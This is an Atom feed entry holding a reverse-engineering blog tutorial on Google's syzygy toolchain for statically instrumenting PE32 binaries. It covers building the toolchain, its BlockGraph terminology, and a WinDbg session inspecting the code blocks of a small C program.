<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Diary of a reverse-engineer]]></title>
  <link href="http://doar-e.github.io/atom.xml" rel="self"/>
  <link href="http://doar-e.github.io/"/>
  <updated>2017-09-06T06:47:31-07:00</updated>
  <id>http://doar-e.github.io/</id>
  <author>
    <name><![CDATA[Axel Souchet, Jonathan Salwan, Jérémy Fetiveau]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    
    <title type="html"><![CDATA[Binary rewriting with syzygy, Pt. I]]></title>
    <link href="http://doar-e.github.io/blog/2017/08/05/binary-rewriting-with-syzygy/"/>
    
    <updated>2017-08-05T16:08:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2017/08/05/binary-rewriting-with-syzygy</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>Binary instrumentation and analysis have been subjects that I have always found fascinating. At compile time via <a href="http://doar-e.github.io/blog/2016/11/27/clang-and-passes/">clang</a>, or at runtime with dynamic binary instrumentation frameworks like <a href="https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool">Pin</a> or <a href="http://www.dynamorio.org/">DynamoRIO</a>. One thing I have always looked for though, is a framework able to statically instrument a PE image. A framework designed a bit like <a href="https://clang.llvm.org/">clang</a> where you can write &lsquo;passes&rsquo; doing various things: transformation of the image, analysis of code blocks, etc. Until a couple of months ago, I wasn&rsquo;t aware of any public and robust projects providing this capability (as in, able to instrument real-world scale programs like Chrome or similar).</p>

<p>In this post (it&rsquo;s been a while I know!), I&rsquo;ll introduce the <a href="https://github.com/google/syzygy">syzygy</a> transformation tool chain with a focus on its <a href="https://github.com/google/syzygy/tree/master/syzygy/instrument">instrumenter</a>, and give an overview of the framework, its capabilities, its limitations, and how you can write transformations yourself. As examples, I&rsquo;ll walk through two simple examples: an analysis pass generating a call-graph, and a transformation pass rewriting the function <code>__report_gsfailure</code> in <a href="https://msdn.microsoft.com/en-us/library/8dbf701c.aspx">/GS</a> protected binaries.</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>Syzygy</h1>

<h2>Introduction and a little bit of History</h2>

<p><a href="https://github.com/google/syzygy/wiki">syzygy</a> is a project written by Google labeled as a &ldquo;transformation tool chain&rdquo;. It encompasses a suite of various utilities: <a href="https://github.com/google/syzygy/blob/master/syzygy/instrument/instrument_app.cc">instrument.exe</a> is the application invoking the various transformation passes and apply them on a binary, <a href="https://github.com/google/syzygy/blob/master/syzygy/grinder/grinder_app.cc">grinder.exe</a>, <a href="https://github.com/google/syzygy/blob/master/syzygy/reorder/reorder_app.cc">reorder.exe</a>, etc. In a nutshell, the framework is able to (non exhaustive list):</p>

<ul>
<li>Read and write PDB files,</li>
<li>&lsquo;Decompose&rsquo; PE32 binaries built with MSVC (with the help of full PDB symbol),</li>
<li>Assemble Intel x86 32 bits code,</li>
<li>Disassemble Intel x86 32 bits code (via <a href="https://github.com/google/syzygy/tree/master/third_party/distorm">Distorm</a>),</li>
<li>&lsquo;Relink&rsquo; an instrumented binary.</li>
</ul>


<p>You also may have briefly heard about the project a while back in this post from May 2013 on Chromium&rsquo;s blog: <a href="https://blog.chromium.org/2013/05/testing-chromium-syzyasan-lightweight.html">Testing Chromium: SyzyASAN, a lightweight heap error detector</a>. As I am sure you all know, <a href="https://github.com/google/sanitizers/wiki/AddressSanitizer">AddressSanitizer</a> is a compile-time instrumentation whose purpose is to <a href="https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm">detect memory errors</a> in C/C++ programs. Long story short, AddressSanitizer tracks the state of your program&rsquo;s memory and instrument memory operations (read / write / heap allocation / heap free) at runtime to make sure that they are &lsquo;safe&rsquo;. For example, in a normal situation reading off by one out-of-bounds on a static sized stack buffer will most likely not result in a crash. AddressSanitizer&rsquo;s job is to detect this issue and to report it to the user.</p>

<p>Currently there is no real equivalent on Windows platforms. The only supported available technology that could help with detecting memory errors is the <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-and-pageheap">Page Heap</a>. Even though today, clang for Windows is working (<a href="https://groups.google.com/a/chromium.org/forum/#!topic/chromium-dev/Y3OEIKkdlu0">Chrome</a> announced that <a href="https://chromium.googlesource.com/chromium/src/+/d2c91228a51bdf37ae3b2e501fb53c0528f1629c">Windows builds of Chrome now use clang</a>), this was not the case back in 2013. As a result, Google built <a href="https://github.com/google/syzygy/wiki/SyzyASanDesignDocument">SyzyASAN</a>, which is the name of a <a href="https://github.com/google/syzygy/blob/master/syzygy/instrument/transforms/asan_transform.h">transformation</a> aiming at detecting memory errors in PE32 binaries. This transform is built on top of the syzygy framework, and you can instrument your binary with it via the <a href="https://github.com/google/syzygy/blob/master/syzygy/instrument/instrument_app.cc#L94">instrument.exe</a> tool. One consequence of the above, is that the framework has to be robust and accurate enough to instrument Chrome; as a result the code is heavily tested which is awesome for us (it is also nearly the only documentation available too 0:&ndash;))!</p>

<h2>Compiling</h2>

<p>In order to get a development environment setup you need to follow specific steps to get all the chromium build/dev tools installed. <a href="https://dev.chromium.org/developers/how-tos/install-depot-tools">depot_tools</a> is the name of the package containing everything you need to properly build the various chromium projects; it includes things like Python, <a href="https://gyp.gsrc.io/">GYP</a>, <a href="https://ninja-build.org/">Ninja</a>, git, etc.</p>

<p>Once depot_tools is installed, it is just a matter of executing the below commands for getting the code and compiling it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>&gt; set PATH=D:\Codes\depot_tools;%PATH%
</span><span class='line'>&gt; mkdir syzygy
</span><span class='line'>&gt; cd syzygy
</span><span class='line'>&gt; fetch syzygy
</span><span class='line'>&gt; cd syzygy\src
</span><span class='line'>&gt; ninja -C out\Release instrument
</span></code></pre></td></tr></table></div></figure>


<p>If you would like more information on the matter, I suggest you read this wiki page: <a href="https://github.com/google/syzygy/wiki/SyzygyDevelopmentGuide">SyzygyDevelopmentGuide</a>.</p>

<h2>Terminology</h2>

<p>The terminology used across the project can be a bit misleading or confusing at first, so it is a good time to describe the key terms and their meanings: a <a href="https://github.com/google/syzygy/blob/master/syzygy/block_graph/block_graph.h">BlockGraph</a> is a basically a container of blocks. A <a href="https://github.com/google/syzygy/blob/master/syzygy/block_graph/block_graph.h#L542">BlockGraph::Block</a> can be either a code block, or a data block (the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms680336(v=vs.85).aspx">IMAGE_NT_HEADERS</a> of your binary would be a data block for example). Every block has various properties like an identifier, a name, etc. and belongs to a section (as in PE sections). Most of those properties are mutable, and you are free to play with them and they will get picked-up by the back-end when relinking the output image. In addition to being a top-level container of blocks, the BlockGraph also keeps track of the sections in your executable. Blocks also have a concept of referrers and references. A reference is basically a link from Block <code>foo</code> to Block <code>bar</code>; where <code>bar</code> is the referent. A referrer can be seen as a cross-reference (in the IDA sense): <code>foo</code> would be a referrer of <code>bar</code>. These two key concepts are very important when building transforms as they also allow you to walk the graph faster. Transferring referrers to another Block is also a very easy operation for example (and is super powerful).</p>

<p>Something that also got me confused at first is their name for a Block is not a basic-block as we know them. Instead, it is a function; a set of basic-blocks. Another key concept being used is called <a href="https://github.com/google/syzygy/blob/master/syzygy/block_graph/block_graph.h#L574">SourceRanges</a>. As Blocks can be combined together or split, they are made so that they look after their own address-space mapping bytes from the original image to bytes in the block.</p>

<p>Finally, the container of basic-blocks as we know them is a <a href="https://github.com/google/syzygy/blob/master/syzygy/block_graph/basic_block_subgraph.h#L38">BasicBlockSubGraph</a> (I briefly mention it a bit later in the post).</p>

<p>Oh, one last thing: the instrumenter is basically the application that decomposes an input binary (comparable to a front-end), present the deconstructed binary (functions, blocks, instructions) to transforms (comparable to a mid-end) that modifies, and finally the back-end part that reconstruct your instrumented binary.</p>

<h2>Debugging session</h2>

<p>To make things clearer &ndash; and because I like debugging sessions &ndash; I think it is worthwhile to spend a bit of time in a debugger actually seeing the various structures and how they map to some code we know. Let&rsquo;s take the following C program and compile it in debug mode (don&rsquo;t forget to enable the full PDB generation with the following linker flag: <code>/PROFILE</code>):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">x</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Binary rewriting with syzygy</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello doar-e.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">foo</span><span class="p">(</span><span class="n">argc</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Throw it to your favorite debugger with the following command &ndash; we will use the afl transformation as an example transform to analyze the data we have available to us:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">instrument</span><span class="p">.</span><span class="n">exe</span> <span class="o">--</span><span class="n">mode</span><span class="o">=</span><span class="n">afl</span> <span class="o">--</span><span class="n">input</span><span class="o">-</span><span class="n">image</span><span class="o">=</span><span class="n">test</span><span class="p">.</span><span class="n">exe</span> <span class="o">--</span><span class="n">output</span><span class="o">-</span><span class="n">image</span><span class="o">=</span><span class="n">test</span><span class="p">.</span><span class="n">instr</span><span class="p">.</span><span class="n">exe</span>
</span></code></pre></td></tr></table></div></figure>


<p>And let&rsquo;s place this breakpoint:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">bm</span> <span class="n">instrument</span><span class="o">!*</span><span class="n">AFLTransform</span><span class="o">::</span><span class="n">OnBlock</span> <span class="s">&quot;.if(@@c++(block-&gt;type_ == 0)){ }.else{ g }&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now it&rsquo;s time to inspect the Block associated with our function <code>foo</code> from above:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">g</span>
</span><span class='line'><span class="n">eax</span><span class="o">=</span><span class="mo">002</span><span class="n">dcf80</span> <span class="n">ebx</span><span class="o">=</span><span class="mo">00000051</span> <span class="n">ecx</span><span class="o">=</span><span class="mo">004</span><span class="mi">82</span><span class="n">da8</span> <span class="n">edx</span><span class="o">=</span><span class="mo">004</span><span class="n">eaba0</span> <span class="n">esi</span><span class="o">=</span><span class="mo">004</span><span class="n">bd398</span> <span class="n">edi</span><span class="o">=</span><span class="mo">004</span><span class="n">bd318</span>
</span><span class='line'><span class="n">eip</span><span class="o">=</span><span class="mo">002</span><span class="n">dcf80</span> <span class="n">esp</span><span class="o">=</span><span class="mf">0113f</span><span class="mi">4</span><span class="n">b8</span> <span class="n">ebp</span><span class="o">=</span><span class="mf">0113f</span><span class="mi">4</span><span class="n">c8</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
</span><span class='line'><span class="n">cs</span><span class="o">=</span><span class="mo">0023</span>  <span class="n">ss</span><span class="o">=</span><span class="mo">002</span><span class="n">b</span>  <span class="n">ds</span><span class="o">=</span><span class="mo">002</span><span class="n">b</span>  <span class="n">es</span><span class="o">=</span><span class="mo">002</span><span class="n">b</span>  <span class="n">fs</span><span class="o">=</span><span class="mo">0053</span>  <span class="n">gs</span><span class="o">=</span><span class="mo">002</span><span class="n">b</span>             <span class="n">efl</span><span class="o">=</span><span class="mo">00000202</span>
</span><span class='line'><span class="n">instrument</span><span class="o">!</span><span class="n">instrument</span><span class="o">::</span><span class="n">transforms</span><span class="o">::</span><span class="n">AFLTransform</span><span class="o">::</span><span class="n">OnBlock</span><span class="o">:</span>
</span><span class='line'><span class="mo">002</span><span class="n">dcf80</span> <span class="mi">55</span>              <span class="n">push</span>    <span class="n">ebp</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="n">block</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x000</span><span class="p">]</span> <span class="n">id_</span>              <span class="o">:</span> <span class="mh">0x51</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x004</span><span class="p">]</span> <span class="n">type_</span>            <span class="o">:</span> <span class="n">CODE_BLOCK</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x008</span><span class="p">]</span> <span class="n">size_</span>            <span class="o">:</span> <span class="mh">0x5b</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x00c</span><span class="p">]</span> <span class="n">alignment_</span>       <span class="o">:</span> <span class="mh">0x1</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x010</span><span class="p">]</span> <span class="n">alignment_offset_</span> <span class="o">:</span> <span class="mi">0</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x014</span><span class="p">]</span> <span class="n">padding_before_</span>  <span class="o">:</span> <span class="mh">0x0</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x018</span><span class="p">]</span> <span class="n">name_</span>            <span class="o">:</span> <span class="mh">0x4ffc70</span> <span class="o">:</span> <span class="s">&quot;foo&quot;</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x01c</span><span class="p">]</span> <span class="n">compiland_name_</span>  <span class="o">:</span> <span class="mh">0x4c50b0</span> <span class="o">:</span> <span class="s">&quot;D:</span><span class="se">\t</span><span class="s">mp</span><span class="se">\t</span><span class="s">est\Debug\main.obj&quot;</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x020</span><span class="p">]</span> <span class="n">addr_</span>            <span class="p">[</span><span class="n">Type</span><span class="o">:</span> <span class="n">core</span><span class="o">::</span><span class="n">detail</span><span class="o">::</span><span class="n">AddressImpl</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">]</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x024</span><span class="p">]</span> <span class="n">block_graph_</span>     <span class="o">:</span> <span class="mh">0x48d10c</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x028</span><span class="p">]</span> <span class="n">section_</span>         <span class="o">:</span> <span class="mh">0x0</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x02c</span><span class="p">]</span> <span class="n">attributes_</span>      <span class="o">:</span> <span class="mh">0x8</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x030</span><span class="p">]</span> <span class="n">references_</span>      <span class="o">:</span> <span class="p">{</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x3</span> <span class="p">}</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x038</span><span class="p">]</span> <span class="n">referrers_</span>       <span class="o">:</span> <span class="p">{</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x1</span> <span class="p">}</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x040</span><span class="p">]</span> <span class="n">source_ranges_</span>   <span class="p">[</span><span class="n">Type</span><span class="o">:</span> <span class="n">core</span><span class="o">::</span><span class="n">AddressRangeMap</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="kt">int</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">,</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">detail</span><span class="o">::</span><span class="n">AddressImpl</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="o">&gt;</span><span class="p">]</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x04c</span><span class="p">]</span> <span class="n">labels_</span>          <span class="o">:</span> <span class="p">{</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x3</span> <span class="p">}</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x054</span><span class="p">]</span> <span class="n">owns_data_</span>       <span class="o">:</span> <span class="nb">false</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x058</span><span class="p">]</span> <span class="n">data_</span>            <span class="o">:</span> <span class="mh">0x49ef50</span> <span class="o">:</span> <span class="mh">0x55</span>
</span><span class='line'>  <span class="p">[</span><span class="o">+</span><span class="mh">0x05c</span><span class="p">]</span> <span class="n">data_size_</span>       <span class="o">:</span> <span class="mh">0x5b</span>
</span></code></pre></td></tr></table></div></figure>


<p>The above shows us every the different properties available in a Block; we can see it is named <code>foo</code>, has the identifier 0x51 and has a size of 0x5B bytes.</p>

<p><img class="center" src="http://doar-e.github.io/images/binary_rewriting_with_syzygy/foo_idaview.png"></p>

<p>It also has one referrer and 3 references, what could they be? With the explanation I gave above, we can guess that the referrer (or cross-ref) must be the <code>main</code> function as it calls into <code>foo</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Block</span> <span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="o">&gt;</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4f87c0</span><span class="p">))</span>
</span><span class='line'>  <span class="n">first</span>            <span class="o">:</span> <span class="mh">0x4bd3ac</span>
</span><span class='line'>  <span class="n">second</span>           <span class="o">:</span> <span class="mi">48</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Block</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4bd3ac</span><span class="p">))</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x000</span><span class="p">]</span> <span class="n">id_</span>              <span class="o">:</span> <span class="mh">0x52</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x004</span><span class="p">]</span> <span class="n">type_</span>            <span class="o">:</span> <span class="n">CODE_BLOCK</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x008</span><span class="p">]</span> <span class="n">size_</span>            <span class="o">:</span> <span class="mh">0x4d</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x00c</span><span class="p">]</span> <span class="n">alignment_</span>       <span class="o">:</span> <span class="mh">0x1</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x010</span><span class="p">]</span> <span class="n">alignment_offset_</span> <span class="o">:</span> <span class="mi">0</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x014</span><span class="p">]</span> <span class="n">padding_before_</span>  <span class="o">:</span> <span class="mh">0x0</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x018</span><span class="p">]</span> <span class="n">name_</span>            <span class="o">:</span> <span class="mh">0x4c51a0</span> <span class="o">:</span> <span class="s">&quot;main&quot;</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x01c</span><span class="p">]</span> <span class="n">compiland_name_</span>  <span class="o">:</span> <span class="mh">0x4c50b0</span> <span class="o">:</span> <span class="s">&quot;D:</span><span class="se">\t</span><span class="s">mp</span><span class="se">\t</span><span class="s">est\Debug\main.obj&quot;</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x020</span><span class="p">]</span> <span class="n">addr_</span>            <span class="p">[</span><span class="n">Type</span><span class="o">:</span> <span class="n">core</span><span class="o">::</span><span class="n">detail</span><span class="o">::</span><span class="n">AddressImpl</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">]</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x024</span><span class="p">]</span> <span class="n">block_graph_</span>     <span class="o">:</span> <span class="mh">0x48d10c</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x028</span><span class="p">]</span> <span class="n">section_</span>         <span class="o">:</span> <span class="mh">0x0</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x02c</span><span class="p">]</span> <span class="n">attributes_</span>      <span class="o">:</span> <span class="mh">0x8</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x030</span><span class="p">]</span> <span class="n">references_</span>      <span class="o">:</span> <span class="p">{</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x4</span> <span class="p">}</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x038</span><span class="p">]</span> <span class="n">referrers_</span>       <span class="o">:</span> <span class="p">{</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x1</span> <span class="p">}</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x040</span><span class="p">]</span> <span class="n">source_ranges_</span>   <span class="p">[</span><span class="n">Type</span><span class="o">:</span> <span class="n">core</span><span class="o">::</span><span class="n">AddressRangeMap</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="kt">int</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">,</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">detail</span><span class="o">::</span><span class="n">AddressImpl</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="o">&gt;</span><span class="p">]</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x04c</span><span class="p">]</span> <span class="n">labels_</span>          <span class="o">:</span> <span class="p">{</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x3</span> <span class="p">}</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x054</span><span class="p">]</span> <span class="n">owns_data_</span>       <span class="o">:</span> <span class="nb">false</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x058</span><span class="p">]</span> <span class="n">data_</span>            <span class="o">:</span> <span class="mh">0x49efb0</span> <span class="o">:</span> <span class="mh">0x55</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x05c</span><span class="p">]</span> <span class="n">data_size_</span>       <span class="o">:</span> <span class="mh">0x4d</span>
</span></code></pre></td></tr></table></div></figure>


<p>Something to keep in mind when it comes to <a href="https://github.com/google/syzygy/blob/master/syzygy/block_graph/block_graph.h#L1046">references</a> is that they are not simply a pointer to a block. A reference does indeed reference a block (duh), but it also has an offset associated to this block to point exactly at where the data is being referenced from.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="c1">// Represents a reference from one block to another. References may be offset.</span>
</span><span class='line'><span class="c1">// That is, they may refer to an object at a given location, but actually point</span>
</span><span class='line'><span class="c1">// to a location that is some fixed distance away from that object. This allows,</span>
</span><span class='line'><span class="c1">// for example, non-zero based indexing into a table. The object that is</span>
</span><span class='line'><span class="c1">// intended to be dereferenced is called the &#39;base&#39; of the offset.</span>
</span><span class='line'><span class="c1">//</span>
</span><span class='line'><span class="c1">// BlockGraph references are from a location (offset) in one block, to some</span>
</span><span class='line'><span class="c1">// location in another block. The referenced block itself plays the role of the</span>
</span><span class='line'><span class="c1">// &#39;base&#39; of the reference, with the offset of the reference being stored as</span>
</span><span class='line'><span class="c1">// an integer from the beginning of the block. However, basic block</span>
</span><span class='line'><span class="c1">// decomposition requires breaking the block into smaller pieces and thus we</span>
</span><span class='line'><span class="c1">// need to carry around an explicit base value, indicating which byte in the</span>
</span><span class='line'><span class="c1">// block is intended to be referenced.</span>
</span><span class='line'><span class="c1">//</span>
</span><span class='line'><span class="c1">// A direct reference to a location will have the same value for &#39;base&#39; and</span>
</span><span class='line'><span class="c1">// &#39;offset&#39;.</span>
</span><span class='line'><span class="c1">//</span>
</span><span class='line'><span class="c1">// Here is an example:</span>
</span><span class='line'><span class="c1">//</span>
</span><span class='line'><span class="c1">//        /----------\</span>
</span><span class='line'><span class="c1">//        +---------------------------+</span>
</span><span class='line'><span class="c1">//  O     |          B                | &lt;--- Referenced block</span>
</span><span class='line'><span class="c1">//        +---------------------------+      B = base</span>
</span><span class='line'><span class="c1">//  \-----/                                  O = offset</span>
</span><span class='line'><span class="c1">//</span>
</span></code></pre></td></tr></table></div></figure>


